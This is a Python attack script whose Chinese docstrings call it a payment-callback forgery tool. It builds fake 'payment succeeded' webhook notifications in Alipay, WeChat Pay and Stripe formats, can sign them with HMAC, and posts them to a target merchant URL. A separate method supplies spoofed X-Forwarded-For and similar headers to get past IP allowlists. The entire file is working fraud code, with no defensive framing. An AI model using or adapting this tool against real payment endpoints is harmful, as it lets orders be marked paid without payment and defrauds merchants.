#!/usr/bin/env python3
"""回调伪造攻击"""
import requests
import json
import hmac
import hashlib
from typing import Dict, Optional

class CallbackSpoofer:
    """支付回调伪造"""

    def __init__(self):
        self.callback_templates = {
            'alipay': self._alipay_callback,
            'wechat': self._wechat_callback,
            'stripe': self._stripe_callback,
            'custom': self._custom_callback,
        }

    def _alipay_callback(self, params: Dict) -> Dict:
        return {
            "trade_no": params.get("trade_no", "2024" + "0" * 20),
            "out_trade_no": params.get("out_trade_no", "ORDER" + "0" * 10),
            "buyer_id": params.get("buyer_id", "2088" + "0" * 12),
            "trade_status": "TRADE_SUCCESS",
            "total_amount": params.get("amount", "0.01"),
            "receipt_amount": params.get("amount", "0.01"),
            "buyer_pay_amount": params.get("amount", "0.01"),
            "gmt_payment": "2024-01-01 12:00:00",
            "notify_id": "NOTIFY" + "0" * 20,
        }

    def _wechat_callback(self, params: Dict) -> Dict:
        return {
            "return_code": "SUCCESS",
            "result_code": "SUCCESS",
            "out_trade_no": params.get("out_trade_no", ""),
            "transaction_id": "wx" + "0" * 20,
            "total_fee": int(float(params.get("amount", 0)) * 100),
            "cash_fee": int(float(params.get("amount", 0)) * 100),
            "time_end": "20240101120000",
            "openid": "oUpF8uMuAJO_M2pxb1Q9zNjWeS6o",
        }

    def _stripe_callback(self, params: Dict) -> Dict:
        return {
            "id": "evt_" + "0" * 24,
            "object": "event",
            "type": "payment_intent.succeeded",
            "data": {
                "object": {
                    "id": "pi_" + "0" * 24,
                    "amount": int(float(params.get("amount", 0)) * 100),
                    "currency": "usd",
                    "status": "succeeded",
                    "charges": {
                        "data": [{"id": "ch_" + "0" * 24, "receipt_url": "https://pay.stripe.com/receipts/..."}]
                    }
                }
            }
        }

    def _custom_callback(self, params: Dict) -> Dict:
        return params

    def forge_callback(self, platform: str, target_url: str, params: Dict, 
                       secret: Optional[str] = None) -> requests.Response:
        """发送伪造回调"""
        callback_data = self.callback_templates.get(platform, self._custom_callback)(params)

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (compatible; Payment-Webhook/1.0)",
        }

        if secret:
            payload = json.dumps(callback_data, sort_keys=True)
            signature = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
            headers["X-Signature"] = signature

        return requests.post(target_url, json=callback_data, headers=headers, timeout=10)

    def bypass_ip_check(self, target_url: str) -> Dict[str, str]:
        """绕过 IP 白名单检查"""
        return {
            "X-Forwarded-For": "203.209.224.0",
            "X-Real-IP": "203.209.224.0",
            "X-Originating-IP": "203.209.224.0",
            "CF-Connecting-IP": "203.209.224.0",
        }
